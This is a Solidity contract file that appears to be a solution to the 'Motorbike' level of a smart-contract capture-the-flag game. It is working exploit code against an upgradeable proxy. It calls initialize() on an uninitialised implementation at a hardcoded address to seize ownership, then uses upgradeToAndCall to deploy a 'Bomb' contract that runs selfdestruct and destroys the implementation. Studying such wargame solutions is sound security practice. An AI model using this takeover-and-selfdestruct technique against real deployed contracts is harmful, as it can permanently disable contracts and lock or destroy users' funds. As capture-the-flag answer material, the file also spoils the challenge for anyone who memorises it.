// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "../Levels/Motorbike.sol";

contract MotorbikeAttack {
     Engine public engine = Engine(0xa37aE2b259D35aF4aBdde122eC90B204323ED304);
     event logEvent(bool, bytes);
     
   function attack() external  {
       (bool success, bytes memory data) = address(engine).call(abi.encodeWithSignature('initialize()'));
       emit logEvent(success, data);
    }
    
    function bombAttack() external {
        // pass in a bomb which blows up when initialize is called
        Bomb bomb = new Bomb();
        
        (bool success, bytes memory data) =  address(engine).call(abi.encodeWithSignature('upgradeToAndCall(address,bytes)', address(bomb), abi.encodeWithSignature("initialize()")));
        emit logEvent(success, data);
    }
}

contract Bomb {
  function initialize() external {
        selfdestruct(msg.sender);
    }
}